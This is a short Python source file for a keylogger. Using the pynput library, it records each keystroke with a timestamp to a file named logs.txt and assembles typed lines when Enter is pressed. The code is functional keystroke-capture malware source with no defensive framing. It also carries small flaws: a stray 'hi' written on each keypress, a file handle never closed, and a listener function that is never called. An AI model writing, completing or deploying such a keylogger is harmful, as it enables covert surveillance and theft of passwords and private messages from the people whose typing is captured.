from pynput.keyboard import Key, Listener
from datetime import datetime

captured = []
file_name = "logs.txt"


#
# makes key listener and concatenates it to the main thread
#
def listen():
    with Listener(on_press=press_action) as key_listener:
        key_listener.join()


#
# handle key press actions
#
def press_action(key):
    if key == Key.enter:
        capture(key, "[Enter]", True)
    elif key == Key.backspace:
        if len(captured) > 0:
            captured.pop()
    elif key == Key.space:
        capture(key, " ", False)
    else:
        capture(key, str(key).replace('\'', '', 2), False)


#
# Gets the data of the pressed key and store them
#
def capture(key, value, finalize):
    file = open(file_name, "a")
    file.write("hi")
    captured.append(value)
    file.write(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + " " * 5 + str(key) + "\n")
    if finalize:
        line = ""
        for letter in captured:
            line += " " + letter
        file.write(line + "\n")
        file.write("_" * 50 + "\n")
        captured.clear()
